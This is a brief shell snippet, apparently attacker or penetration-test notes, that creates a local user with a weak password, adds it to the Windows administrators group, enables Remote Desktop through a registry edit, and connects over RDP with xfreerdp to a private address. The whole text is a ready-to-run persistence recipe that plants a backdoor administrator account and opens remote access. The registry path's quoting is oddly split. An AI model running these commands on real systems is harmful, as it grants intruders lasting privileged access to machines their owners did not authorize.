
```SHELL
Add user  
net user hardlims Aa123456 /add  
net localgroup administrators hardlims /add  


Enable RDP  
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
xfreerdp /d:CLIENTWK221 /u:hardlims /p:"Aa123456" /v:192.168.226.95
```